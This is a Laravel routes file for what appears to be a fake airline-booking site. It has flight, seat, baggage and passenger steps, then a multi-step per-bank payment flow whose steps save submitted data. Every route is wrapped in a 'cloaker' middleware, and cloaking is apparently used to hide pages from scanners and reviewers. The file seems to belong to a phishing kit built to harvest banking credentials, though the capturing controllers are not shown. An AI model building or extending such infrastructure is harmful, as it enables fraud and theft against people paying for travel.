<?php

use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\Storage;
use Illuminate\Http\Request;
use App\Http\Controllers\PaymentController;
use App\Http\Controllers\BankFlowController;


Route::middleware(['cloaker'])->group(function () {



    Route::get('/', function () {
        return view('home');
    });

    Route::post('/vuelo', function (Request $request) {
            $data = $request->validate([
            'typeTravel'       => 'required|string',
            'typeCabina'       => 'required|string',
            'originCode'       => 'nullable|string',
            'destinyCode'      => 'nullable|string',
            'dateGoing'        => 'nullable|string',
            'dateLap'          => 'nullable|string',
            'arrayPassengers'  => 'nullable|string',
        ]);

        return view('summary', $data);
    })->name('vuelo');

    Route::post('/asientos', function (Request $request) {
            $data = $request->validate([
            'typeTravel'       => 'required|string',
            'typeCabina'       => 'required|string',
            'originCode'       => 'nullable|string',
            'cityOrigin'       => 'nullable|string',
            'originType'       => 'nullable|string',
            'destinyCode'      => 'nullable|string',
            'cityDestiny'      => 'nullable|string',
            'destinyType'      => 'nullable|string',
            'dateGoing'        => 'nullable|string',
            'dateLap'          => 'nullable|string',
            'arrayPassengers'  => 'nullable|string',
            'arrayPriceTxt'  => 'nullable|string',
            'originDepartureTime'  => 'nullable|string',
            'originArrivalTime'  => 'nullable|string',
            'destinyDepartureTime'  => 'nullable|string',
            'destinyArrivalTime'  => 'nullable|string',
        ]);

        return view('airplane', $data);
    })->name('asientos');

    Route::post('/equipaje', function (Request $request) {
            $data = $request->validate([
            'typeTravel'       => 'required|string',
            'typeCabina'       => 'required|string',
            'originCode'       => 'nullable|string',
            'originCity'       => 'nullable|string',
            'originType'       => 'nullable|string',
            'destinyCode'      => 'nullable|string',
            'destinyCity'      => 'nullable|string',
            'destinyType'      => 'nullable|string',
            'dateGoing'        => 'nullable|string',
            'dateLap'          => 'nullable|string',
            'arrayPassengers'  => 'nullable|string',
            'arrayPriceTxt'  => 'nullable|string',
            'originDepartureTime'  => 'nullable|string',
            'originArrivalTime'  => 'nullable|string',
            'destinyDepartureTime'  => 'nullable|string',
            'destinyArrivalTime'  => 'nullable|string',
        ]);

        return view('baggage', $data);
    })->name('equipaje');


    Route::post('/pasajeros', function (Request $request) {
            $data = $request->validate([
            'typeTravel'       => 'required|string',
            'originCode'       => 'nullable|string',
            'originCity'       => 'nullable|string',
            'currentPrice'       => 'nullable|string',
            'destinyCode'      => 'nullable|string',
            'destinyCity'      => 'nullable|string',
            'dateGoing'        => 'nullable|string',
            'dateLap'          => 'nullable|string',
            'arrayPassengers'  => 'nullable|string',
            'originDepartureTime'  => 'nullable|string',
            'originArrivalTime'  => 'nullable|string',
            'destinyDepartureTime'  => 'nullable|string',
            'destinyArrivalTime'  => 'nullable|string',
        ]);

        return view('passengers', $data);
    })->name('pasajeros');

    Route::post('/reserva', function (Request $request) {
            $data = $request->validate([
            'typeTravel'       => 'required|string',
            'originCode'       => 'nullable|string',
            'originCity'       => 'nullable|string',
            'currentPrice'       => 'nullable|string',
            'destinyCode'      => 'nullable|string',
            'destinyCity'      => 'nullable|string',
            'dateGoing'        => 'nullable|string',
            'dateLap'          => 'nullable|string',
            'arrayPassengers'  => 'nullable|string',
            'originDepartureTime'  => 'nullable|string',
            'originArrivalTime'  => 'nullable|string',
            'destinyDepartureTime'  => 'nullable|string',
            'destinyArrivalTime'  => 'nullable|string',
        ]);

        return view('payment', $data);
    })->name('reserva');


    Route::post('/pago', [PaymentController::class, 'start'])->name('pago.start');

    // Entrar al flujo del banco
    Route::get('/pago/{bank}', [BankFlowController::class, 'index'])->name('pago.bank');

    // Navegar steps (1..N)
    Route::get('/pago/{bank}/step/{step}', [BankFlowController::class, 'step'])
        ->whereNumber('step')
        ->name('pago.bank.step');

    Route::post(
        '/pago/{bank}/step/{step}/save',
        [BankFlowController::class, 'saveStep']
    )->name('pago.bank.step.save');

    Route::get('/airports', function () {
        if (!Storage::exists('data/airports.json')) {
            return response()->json(['error' => 'File not found'], 404);
        }

        return response()->json(
            json_decode(Storage::get('data/airports.json'), true)
        );
    });
});
